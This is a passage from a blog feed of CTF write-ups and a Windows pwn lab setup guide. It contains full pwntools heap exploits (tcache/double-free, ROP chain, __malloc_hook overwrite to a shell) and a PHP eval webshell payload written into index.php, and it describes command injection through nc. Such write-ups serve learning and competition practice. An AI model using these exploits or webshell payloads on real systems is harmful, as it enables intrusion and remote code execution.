class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1/16</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ezhttp"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">'./libc-2.27.so'</span>&#125;)</span><br><span class="line">p = remote(<span class="string">"183.129.189.61"</span>,<span class="number">53102</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"======= Send Http packet to me: ========"</span>)</span><br><span class="line">p.send(<span class="string">'''</span></span><br><span class="line"><span class="string">POST /create /</span></span><br><span class="line"><span class="string">Cookie: user=admin</span></span><br><span class="line"><span class="string">token: \x0d</span></span><br><span class="line"><span class="string">\r\n\r\ncontent='''</span>+data+<span class="string">'''</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"======= Send Http packet to me: ========"</span>)</span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">POST /del /</span></span><br><span class="line"><span class="string">Cookie: user=admin</span></span><br><span class="line"><span class="string">token: \x0d</span></span><br><span class="line"><span class="string">\r\n\r\nindex='''</span>+str(idx)+<span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"======= Send Http packet to me: ========"</span>)</span><br><span class="line">p.send(<span class="string">'''</span></span><br><span class="line"><span class="string">POST /edit /</span></span><br><span class="line"><span class="string">Cookie: user=admin</span></span><br><span class="line"><span class="string">token: \x0d</span></span><br><span class="line"><span class="string">\r\n\r\nindex='''</span>+str(idx)+<span class="string">'''&amp;content='''</span>+data+<span class="string">'''</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(data)</span>:</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">'''</span></span><br><span class="line"><span class="string">POST /create /</span></span><br><span class="line"><span class="string">Cookie: user=admin</span></span><br><span class="line"><span class="string">token: \x0d</span></span><br><span class="line"><span class="string">\r\n\r\ncontent='''</span>+data+<span class="string">'''</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">(idx)</span>:</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">POST /del /</span></span><br><span class="line"><span class="string">Cookie: user=admin</span></span><br><span class="line"><span class="string">token: \x0d</span></span><br><span class="line"><span class="string">\r\n\r\nindex='''</span>+str(idx)+<span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit2</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">'''</span></span><br><span class="line"><span class="string">POST /edit /</span></span><br><span class="line"><span class="string">Cookie: user=admin</span></span><br><span class="line"><span class="string">token: \x0d</span></span><br><span class="line"><span class="string">\r\n\r\nindex='''</span>+str(idx)+<span class="string">'''&amp;content='''</span>+data+<span class="string">'''</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">libc.address = <span class="number">0x00007ffff79e2000</span></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0xf0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Your gift: 0x"</span>)</span><br><span class="line">heap = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x12</span>)</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'__free_hook'</span>])</span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'__malloc_hook'</span>])</span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'setcontext'</span>])</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(p64(heap<span class="number">-0x10</span>)[:<span class="number">6</span>])</span><br><span class="line">add(p64(heap<span class="number">-0x10</span>)[:<span class="number">6</span>])</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'\x80\xe7'</span>)</span><br><span class="line"><span class="comment">#add(p64(heap)[:6])</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(p64(heap)[:<span class="number">6</span>])</span><br><span class="line">add(<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'\xe3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'\x60\xe7'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(p64(heap)[:<span class="number">6</span>])</span><br><span class="line">add(<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="string">'\x00'</span>)</span><br><span class="line">add(p64(<span class="number">0xfbad1801</span>)[:<span class="number">6</span>])</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1801</span>))</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>))<span class="number">-0x3EC7E3</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(libc.sym[<span class="string">'__free_hook'</span>])[:<span class="number">6</span>])</span><br><span class="line">add(p64(<span class="number">0</span>)[:<span class="number">6</span>])</span><br><span class="line">add(p64(libc.sym[<span class="string">'setcontext'</span>])[:<span class="number">6</span>])</span><br><span class="line">pop_rax = <span class="number">0x0000000000043a78</span> +libc.address</span><br><span class="line">pop_rdi = <span class="number">0x000000000002155f</span> +libc.address</span><br><span class="line">pop_rsi = <span class="number">0x0000000000023e8a</span> +libc.address</span><br><span class="line">pop_rdx = <span class="number">0x0000000000001b96</span> +libc.address</span><br><span class="line">pop_rsi_rbp = <span class="number">0x000000000007dd9e</span> +libc.address</span><br><span class="line">syscall = <span class="number">0x00000000000013c0</span> +libc.address</span><br><span class="line">syscall = <span class="number">0x11B957</span> +libc.address</span><br><span class="line">payload = <span class="string">'./flag'</span>.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap+<span class="number">0x120</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap+<span class="number">0x500</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += p64(pop_rsi_rbp)</span><br><span class="line">payload += p64(heap+<span class="number">0x130</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(pop_rdi+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap+<span class="number">0x500</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"><span class="keyword">print</span> hex(len(payload))</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b free')</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&quot;mmutag&quot;&gt;&lt;a href=&quot;#mmutag&quot; class=&quot;headerlink&quot; title=&quot;mmutag&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>windows pwn环境搭建</title>
    <link href="https://nuoye-blog.github.io/2020/09/12/2f169ae1/"/>
    <id>https://nuoye-blog.github.io/2020/09/12/2f169ae1/</id>
    <published>2020-09-12T04:00:00.000Z</published>
    <updated>2020-09-12T11:52:46.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="windows-pwn环境搭建"><a href="#windows-pwn环境搭建" class="headerlink" title="windows pwn环境搭建"></a>windows pwn环境搭建</h1><h2 id="下载镜像并搭建虚拟机"><a href="#下载镜像并搭建虚拟机" class="headerlink" title="下载镜像并搭建虚拟机"></a>下载镜像并搭建虚拟机</h2><p><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">网站</a></p><p>这里下载<code>win7 professional with sp1</code>版本（即<code>cn_windows_7_professional_with_sp1_vl_build_x64_dvd_u_677816.iso</code>镜像）。</p><p>接着新建虚拟机即可。</p><h2 id="安装python"><a href="#安装python" class="headerlink" title="安装python"></a>安装python</h2><p>选择版本2.7</p><p>下载地址：<a href="https://www.python.org/downloads/release/python-2718/" target="_blank" rel="noopener">https://www.python.org/downloads/release/python-2718/</a></p><h2 id="安装windbg"><a href="#安装windbg" class="headerlink" title="安装windbg"></a>安装windbg</h2><p>下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=8279" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=8279</a></p><h2 id="安装wincheck"><a href="#安装wincheck" class="headerlink" title="安装wincheck"></a>安装wincheck</h2><p>首先下载安装<code>cmake</code>：<a href="https://cmake.org/download/" target="_blank" rel="noopener">https://cmake.org/download/</a></p><p>安装<code>vcpkg</code>，项目地址：<a href="https://github.com/microsoft/vcpkg" target="_blank" rel="noopener">https://github.com/microsoft/vcpkg</a></p><p>PS：已经安装好了VS，没有这个环节的话不太清楚</p><p>运行命令即可安装完成：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> VCPKG_DEFAULT_TRIPLET=x64-windows</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/microsoft/vcpkg</span><br><span class="line">.\vcpkg\bootstrap-vcpkg.bat</span><br><span class="line">vcpkg integrate install</span><br></pre></td></tr></table></figure><p>接着下载wincheck，项目地址：<a href="https://github.com/trailofbits/winchecksec" target="_blank" rel="noopener">https://github.com/trailofbits/winchecksec</a></p><p>修改其中的<code>CMakeLists.txt</code>，在<code>find_package</code>前添加下面两句命令（之前一直找不到包，卡了好久）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set(pe-parse_DIR %vcpkg&#x2F;buildtrees&#x2F;pe-parse&#x2F;x64-windows-rel&#x2F;pe-parser-library)</span><br><span class="line">set(uthenticode_DIR %vcpkg&#x2F;buildtrees&#x2F;uthenticode&#x2F;x64-windows-rel&#x2F;src)</span><br></pre></td></tr></table></figure><p>其中<code>%vcpkg</code>为<code>vcpkg</code>的地址。</p><p>然后跟着命令走：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; vcpkg install pe-parse uthenticode</span><br><span class="line">&gt; git <span class="built_in">clone</span> https://github.com/trailofbits/winchecksec.git</span><br><span class="line">&gt; <span class="built_in">cd</span> winchecksec</span><br><span class="line">&gt; mkdir build</span><br><span class="line">&gt; <span class="built_in">cd</span> build</span><br><span class="line">&gt; cmake ..</span><br><span class="line">&gt; cmake --build . --config Release</span><br><span class="line">&gt; .\Release\winchecksec.exe C:\Windows\notepad.exe</span><br></pre></td></tr></table></figure><p>这样基本就完成winpwn的环境搭建。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;windows-pwn环境搭建&quot;&gt;&lt;a href=&quot;#windows-pwn环境搭建&quot; class=&quot;headerlink&quot; title=&quot;windows pwn环境搭建&quot;&gt;&lt;/a&gt;windows pwn环境搭建&lt;/h1&gt;&lt;h2 id=&quot;下载镜像并搭建虚拟机&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="windows" scheme="https://nuoye-blog.github.io/categories/windows/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="vmware" scheme="https://nuoye-blog.github.io/tags/vmware/"/>
    
      <category term="windows" scheme="https://nuoye-blog.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>2020羊城杯-WP</title>
    <link href="https://nuoye-blog.github.io/2020/09/12/d71d6ff7/"/>
    <id>https://nuoye-blog.github.io/2020/09/12/d71d6ff7/</id>
    <published>2020-09-12T04:00:00.000Z</published>
    <updated>2020-09-12T11:52:46.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是不当人的一场比赛。。恰逢考试，还要一个人兼pwn和web，难受。。。。还好web不算太难，pwn的解题率就不尽人意了。。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h3><p><a href="http://183.129.189.60:10035/index.php，提示eval" target="_blank" rel="noopener">http://183.129.189.60:10035/index.php，提示eval</a> cmd，直接用蚁剑连接，密码cmd。在网站目录下找到bbbbbbbbb.txt文件，用base64解码得到包含flag的图片。</p><h3 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h3><p>在Hei_Mao_Jing_Chang.mp3中找到php的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'Black-Cat-Sheriff'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'One-ear'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'谁！竟敢踩我一只耳的尾巴！'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">"clandestine"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'White-cat-monitor'</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'White-cat-monitor'</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'One-ear'</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">'Black-Cat-Sheriff'</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"nc"</span>.$_POST[<span class="string">'One-ear'</span>]);</span><br></pre></td></tr></table></figure><p>通过将White-cat-monitor设置为数组类型，使hash_hmac函数报错返回0，从而得到key，接着利用key进行sha256加密并且任意命令执行，在网站目录下flag.php中包含有flag。</p><p>POST数据：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20200911194044.png" alt="image-20200911193936098"></p><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>php代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nHello, world"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接向index.php写入一句话木马即可，GET数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;index.php&amp;content&#x3D;%3C?php%20@eval($_POST[%27attack%27])%20?%3E</span><br></pre></td></tr></table></figure><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>简单的UAF漏洞。首先通过unsortbin来leak出libc地址，接着利用double free来申请到<code>__malloc_hook</code>处改为onegadget即可getshell了。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">"sign_in"</span>).libc</span><br><span class="line">p = process(<span class="string">"sign_in"</span>)</span><br><span class="line">p = remote(<span class="string">"183.129.189.60"</span>,<span class="string">"10029"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,message)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"game's name: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">" message:"</span>)</span><br><span class="line">p.send(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'aaa\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'aaa\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'\n'</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"Game[2]'s name :"</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3C4B0A</span></span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)+<span class="string">'\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0xb</span>+p64(libc.sym[<span class="string">'realloc'</span>]+<span class="number">6</span>)+p64(libc.address+one[<span class="number">1</span>])+<span class="string">'\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b malloc')</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="repwn"><a href="#repwn" class="headerlink" title="repwn"></a>repwn</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" 